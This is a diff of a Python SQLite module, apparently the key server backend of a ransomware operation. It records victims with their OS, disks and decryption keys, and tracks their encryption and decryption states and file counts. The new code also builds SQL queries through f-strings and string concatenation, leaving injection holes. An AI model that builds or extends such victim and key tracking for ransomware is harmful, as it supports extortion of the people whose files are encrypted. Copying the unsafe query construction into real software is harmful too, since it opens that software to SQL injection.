@@ -1,127 +1,208 @@
 import sqlite3
-import message
-import configgetter
-from datetime import datetime
+import time
+#import configgetter
 
-conf = configgetter.get_specific_data("../config.json", "victim_database")
+#conf = configgetter.get_specific_data("../config.json", "victim_database")
 
-DB_FILENAME = '../serveur_cles/data/victims.sqlite'
-
-
-def list_victim():
-    # Connection DB
-    conn = sqlite3.connect(DB_FILENAME)
-    c = conn.cursor()
-    victim_list = ""
-    c.execute('SELECT * FROM victims')
-
-    # récupération des résultats
-    rows = c.fetchall()
-
-    for row in rows:
-        victim_list += '{0:2} {1:3} {2:4} {3:5} {4:6} \n'.format(str(row[0]), str(row[1]), str(row[2]), str(row[3]), str(row[4]))
-
-    # affichage des résultats
-
-    conn.commit()
-    conn.close()
-    return victim_list
+DB_FILENAME = 'data/victims.sqlite'
+DEBUG_MODE = False
 
 
+def connect_db():
+    sqlite_connection = None
+    try:
+        sqlite_connection = sqlite3.connect(DB_FILENAME)
+    except sqlite3.Error as error:
+        print("Failed to connect database", DB_FILENAME, error)
+    finally:
+        if sqlite_connection:
+            return sqlite_connection
 
-def insert_victim(victim):
-    '''List_victim_req = { 'LIST_REQ': None }
-    list_victim_resp = {
-    'VICTIM': id,
-    'HASH': hash ,
-    'OS': type,
-    'DISKS': disks,
-    'STATE': state,
-    'NB_FILES': nb_files
-    }
-    list_victim_end = { 'LIST_END': None }'''
-    # Connection DB
-    conn = sqlite3.connect(DB_FILENAME)
-    c = conn.cursor()
-    listing = ""
 
-    c.execute('INSERT INTO victims VALUES (?, ?, ?, ?,?)', [victim[0], victim[2], victim[1], victim[3], None])
+def insert_data(conn, table, items, data):
+    insert_query = "INSERT INTO " + table + " " + items + " VALUES " + data
+    if DEBUG_MODE:
+        print(insert_query)
 
-    rows = c.fetchall()
+    try:
+        cursor = conn.cursor()
+        cursor.execute(insert_query)
+        if DEBUG_MODE:
+            print(f"Record inserted successfully into {DB_FILENAME}.{table} table ", cursor.rowcount)
+        conn.commit()
+        cursor.close()
+    except sqlite3.Error as error:
+        print("Failed to insert data into sqlite table", error)
 
-    for row in rows:
-        listing += row
-    conn.commit()
-    conn.close()
-    return listing
+
+def select_data(conn, select_query):
+    if DEBUG_MODE:
+        print(select_query)
+
+    try:
+        cursor = conn.cursor()
+        cursor.execute(select_query)
+        records = cursor.fetchall()
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print("Failed to read data from sqlite table", error)
+    else:
+        return records
+
+
+def select_data_script(conn, select_query):
+    if DEBUG_MODE:
+        print(select_query)
+
+    try:
+        cursor = conn.cursor()
+        cursor.executescript(select_query)
+        records = cursor.fetchall()
+        cursor.close()
+
+    except sqlite3.Error as error:
+        print("Failed to read data from sqlite table", error)
+    else:
+        return records
+
+        
+def list_victims(conn):
+    # victims contient la liste de toutes les victimes (id_victim, hash, os, disks, state)
+    query = '''
+    SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
+    FROM (SELECT id_victim, MAX(datetime), state AS last_state
+    FROM states
+    GROUP BY id_victim) AS last_states
+    INNER JOIN victims ON victims.id_victim = last_states.id_victim
+    '''
+    victims = select_data(conn, query)  # victims[n][victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state ]
+
+    # victims_list contient la liste de toutes les victimes (id_victim, hash, os, disks, state, nb_files)
+    i = 0
+    victims_list = []
+    for victim in victims:
+        victims_list.append(list(victim))
+        if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
+            query = f'''
+            SELECT encrypted.nb_files
+            FROM encrypted
+            WHERE encrypted.id_victim = {victim[0]}
+              AND encrypted.datetime = (SELECT MAX(datetime) 
+                                          FROM encrypted 
+                                         WHERE id_victim = {victim[0]})
+            '''
+            nb_files = select_data(conn, query)
+            if nb_files:
+                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            else:
+                nb_files = 0
+            victims_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
+        elif victim[4] == 'DECRYPT' or victim[4] == 'PROTECTED':
+            query = f'''
+            SELECT decrypted.nb_files
+            FROM decrypted
+            WHERE decrypted.id_victim = {victim[0]}
+              AND decrypted.datetime = (SELECT MAX(datetime) 
+                                          FROM decrypted 
+                                         WHERE id_victim = {victim[0]})
+            '''
+            nb_files = select_data(conn, query)
+            if nb_files:
+                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            else:
+                nb_files = 0
+            victims_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
+        else:
+            victims_list[i].append(0)   # ajout du 0 pour le cas INITIALIZE
+        i += 1
+
+    return victims_list
 
 
 # Define a function to insert victim information into the database
-def insert_victim_new(os, hash, disks, key):
-    # Connection DB
-    conn = sqlite3.connect(DB_FILENAME)
+def insert_victim_new(conn, hash_victim, os_victim, disk_victim, key_victim):
+    """
+    Enregistre une nouvelle victime dans la DB
+    :param conn: Connexion à la DB
+    :param hash_victim:
+    :param os_victim:
+    :param disk_victim:
+    :param key_victim:
+    :return: (int) le nouvel id_victim en DB
+    """
+    current_date = int(time.time())
+    # Enregistrement de la nouvelle victime
+    data_victim = (os_victim, hash_victim, disk_victim, key_victim)
+    insert_data(conn, 'victims', '(os, hash, disks, key)', f'{data_victim}')
 
-    now = datetime.now()
-    date_time = now.strftime("%Y-%m-%d %H:%M:%S")
+    # Récupère l'ID de la nouvelle victime
+    query = f'''
+    SELECT victims.id_victim
+    from victims
+    where victims.hash = "{hash_victim}"
+    '''
+    id_victim = select_data(conn, query)
+    id_victim = id_victim[0][0]
 
-    # Get the highest ID from the "victims" table and increment it by 1
-    result = conn.execute("SELECT MAX(id_victim) FROM victims")
-    max_id = result.fetchone()[0]
-    if max_id is None:
-        max_id = 0
-    victim_id = max_id + 1
+    # Enregistrement de l'état INITIALIZE
+    data_state = (id_victim, current_date, 'INITIALIZE')
+    insert_data(conn, 'states', '(id_victim, datetime, state)', f'{data_state}')
 
-    # Get the highest ID from the "states" table and increment it by 1
-    result = conn.execute("SELECT MAX(id_state) FROM states")
-    max_id = result.fetchone()[0]
-    if max_id is None:
-        max_id = 0
-    state_id = max_id + 1
-
-    # Insert victim's information into the "victims" table with the generated ID
-    conn.execute("INSERT INTO victims (id_victim, os, hash, disks, key) VALUES (?, ?, ?, ?, ?)", (victim_id, os, hash, disks, key))
-
-    # Insert a new state with the ID of the victim and the current date and time into the "states" table
-    conn.execute("INSERT INTO states (id_state, id_victim, date_time, state) VALUES (?, ?, ?, ?)", (state_id, victim_id, date_time, "new"))
-    conn.commit()
-
-
-
-
-
-def history_req(victim_id):
-    # Connection DB
-    # Todo: Only 1 ID working. Check decrypted too !
-    conn = sqlite3.connect(DB_FILENAME)
-    c = conn.cursor()
-    history = []
-    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT  JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim=?', victim_id)
-    # récupération des résultats
-    rows = c.fetchall()
-
-    # affichage des résultats
-    for row in rows:
-        history += row
-    conn.commit()
-    conn.close()
-    return history
+    return id_victim
 
 
-def change_state(victim_id, state):
-    # Connection DB
-    conn = sqlite3.connect(DB_FILENAME)
-    c = conn.cursor()
 
 
-    cursor = conn.execute("SELECT MAX(id_victim) FROM states")
-    max_id = cursor.fetchone()[0] or 0
-    state_id = max_id + 1
+def history_req(conn, id_victim):
+    # histories contient la liste de tous les historiques d'état (id_victim, datetime, state)
+    query = f'''
+        SELECT states.id_victim, states.datetime, states.state
+        FROM states
+        WHERE states.id_victim = {id_victim}
+        '''
+    histories = select_data(conn, query)
 
-    date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    c.execute('INSERT INTO states VALUES (?, ?, ?, ?)', [state_id, victim_id, date_time, state])
+    # histories_list contient la liste de tous les historiques d'état (id_victim, datetime, state, nb_files)
+    i = 0
+    histories_list = []
+    for history in histories:
+        histories_list.append(list(history))
+        if history[2] == 'CRYPT' or history[2] == 'PENDING':
+            query = f'''
+                SELECT encrypted.nb_files
+                FROM encrypted
+                WHERE encrypted.id_victim = {history[0]}
+                  AND encrypted.datetime = {history[1]}
+                '''
+            nb_files = select_data(conn, query)
+            if nb_files:
+                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            else:
+                nb_files = 0
+            histories_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
+        elif history[2] == 'DECRYPT' or history[2] == 'PROTECTED':
+            query = f'''
+                SELECT decrypted.nb_files
+                FROM decrypted
+                WHERE decrypted.id_victim = {history[0]}
+                  AND decrypted.datetime = {history[1]}
+                '''
+            nb_files = select_data(conn, query)
+            if nb_files:
+                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
+            else:
+                nb_files = 0
+            histories_list[i].append(nb_files)  # ajout du dernier nb_files decrypted
+        else:
+            histories_list[i].append(0)  # ajout du 0 pour le cas INITIALIZE
+        i += 1
 
-    conn.commit()
-    conn.close()
+    return histories_list
+
+
+def change_state(conn, id_victim):
+    insert_data(conn, 'states', '(id_victim, datetime, state)', f"({id_victim}, {int(time.time())}, 'DECRYPT')")
 
 
 '''
